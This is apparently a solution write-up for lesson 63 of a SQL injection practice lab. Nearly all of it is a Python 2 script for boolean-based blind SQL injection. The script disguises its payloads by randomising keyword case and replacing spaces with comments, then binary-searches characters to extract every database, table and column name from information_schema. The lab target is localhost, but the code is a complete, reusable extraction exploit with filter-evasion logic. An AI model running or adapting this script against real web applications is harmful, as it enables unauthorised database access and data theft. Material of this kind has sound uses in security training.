# Lesson-63
```
Bool盲注
```

```
#!/usr/bin/env python
# encoding:utf8

import requests
import time
import sys
import random

# hack-config-start
payload = "0'|()--+" # 样例 : 0"or()or"="1 或	0' or()or '='1 用空括号把产生Bool值的地方包裹起来
success_symbol = "Your Login name :"
url = "http://127.0.0.1/Less-63/?id="
# 如果对参数进行了过滤 , 需要配置temper函数 , 双写或者加注释绕过
# hack-config-end

# config-start
sleep_time = 5
error_time = 1
# config-end

# define-start
system_schema_names = ['information_schema','test','mysql','performance_schema','phpmyadmin']
# 关键字
random_up_low_keywords = ['select','union','from','limit']
# 函数名
random_up_low_keywords.append('ascii')
random_up_low_keywords.append('substring')
# 系统库名/表名/列名
random_up_low_keywords.append('information_schema')
random_up_low_keywords.append('schemata')
random_up_low_keywords.append('tables')
random_up_low_keywords.append('columns')
random_up_low_keywords.append('schema_name')
random_up_low_keywords.append('table_name')
random_up_low_keywords.append('column_name')
# define-end

# TODO-start
# 优化显示
# TODO-end

def temper(tempPayload):
	global random_up_low_keywords
	for tempKeyword in random_up_low_keywords:
		tempPayload = tempPayload.replace(tempKeyword,getRandomType(tempKeyword))
	tempPayload = tempPayload.replace(" ","/**/")
	tempPayload = tempPayload.replace(" ","%a0")
	# tempPayload = tempPayload.replace("or","oorr")
	# tempPayload = tempPayload.replace("and","anandd")
	return tempPayload

def getRandomType(keywords):
    # TODO 返回随机大小写
    random_int = random.randint(0, len(keywords) - 1)
    tempList = list(keywords)
    tempList[random_int] = tempList[random_int].upper()
    return "".join(tempList)

def getPayload(database_name, table_name, column_name, where, indexOfResult, indexOfChar, mid):
	global payload
	# http://127.0.0.1/Less-65/index.php?id=0"or()or"="1
	startStr = payload.split("()")[0]
	endStr = payload.split("()")[1]
	# ((asCIi(sUBString((sELEct/**/scheMA_Name/**/FRom/**/inforMATion_scheMa.schemaTa/**//**/liMit/**/0,1),1,1)))>0)
	temppayload = "((ascii(substring((select " + column_name + " from " + database_name + "." + table_name + " " + where + " limit " + indexOfResult + ",1)," + indexOfChar + ",1)))>" + mid + ")"
	temppayload = startStr + temppayload + endStr
	# temper
	temppayload = temper(temppayload)
	return temppayload

def exce(database_name, table_name, column_name, where, indexOfResult, indexOfChar, mid):
	global success_symbol
	global url
	# content-start
	tempurl = url + getPayload(database_name, table_name, column_name, where, indexOfResult, indexOfChar, mid)
	content = requests.get(tempurl).text
	# print content
	# content-end
	# judge-start
	if success_symbol in content:
		return True
	else:
		return False
	# judge-end

def doubleSearch(database_name, table_name, column_name, where, indexOfResult,indexOfChar,left_number, right_number):
	while left_number < right_number:
		mid = int((left_number + right_number) / 2)
		if exce(database_name, table_name, column_name, where, str(indexOfResult),str(indexOfChar + 1),str(mid)):
			left_number = mid
		else:
			right_number = mid
		if left_number == right_number - 1:
			if exce(database_name, table_name, column_name, where, str(indexOfResult),str(indexOfChar + 1),str(mid)):
				mid += 1
				break
			else:
				break
	return chr(mid)

def getAllData(database_name, table_name, column_name, where):
	allData = []
	for i in range(32): # 需要遍历的查询结果的数量
		counter = 0
		data = ""
		for j in range(32): # 结果的长度
			counter += 1
			temp = doubleSearch(database_name, table_name, column_name, where, i, j, 0, 128) # 从255开始查询
			if ord(temp) == 1: # 当为1的时候说明已经查询结束
			    break
			sys.stdout.write(temp)
			sys.stdout.flush()
			data += temp
		if counter == 1: # 当结果集的所有行都被遍历后退出
			break
		sys.stdout.write("\r\n")
		sys.stdout.flush()
		allData.append(data)
	return allData

def getAllSchemaNames():
	return getAllData(column_name="schema_name", table_name="schemata", database_name="information_schema", where="")

def getAllTableNames(schema_name):
	return getAllData(column_name="table_name", table_name="tables", database_name="information_schema",  where="where(table_schema='" + schema_name + "')")

def getAllColumnNames(schema_name, table_name):
	return getAllData(column_name="column_name", table_name="columns", database_name="information_schema",  where="where(table_name='" + table_name + "' and table_schema='" + schema_name + "')")


def hack():
	print "================================"
	print "正在获取所有数据库 ..."
	allSchemaNames = getAllSchemaNames()
	print "所有数据库名获取完毕 !"
	print "================================"
	print "正在获取所有数据库表名 ..."
	tempDic = {}
	allUserSchemaNames = []
	for schema_name in allSchemaNames:
		print "--------------------------------"
		print "当前数据库 : " + schema_name + "\t",
		IS_SYSTEM_SCHEMA = False
		for system_schema_name in system_schema_names:
			if system_schema_name == schema_name:
				print "Mysql自带系统数据库 , 智能忽略 !"
				IS_SYSTEM_SCHEMA = True
				break
		if not IS_SYSTEM_SCHEMA:
			print ""
			allUserSchemaNames.append(schema_name)
			tempDic[schema_name] = getAllTableNames(schema_name)
	print "所有表名获取完毕!"
	print "================================"
	print "正在获取所有表列名 ..."
	for schema_name in allUserSchemaNames:
		print "--------------------------------"
		for table_name in tempDic[schema_name]:
			print "当前数据库 : " + schema_name + "\t当前表名 : " + table_name
			getAllColumnNames(schema_name, table_name)
	print "所有列名获取完毕!"
	print "================================"

hack()
```
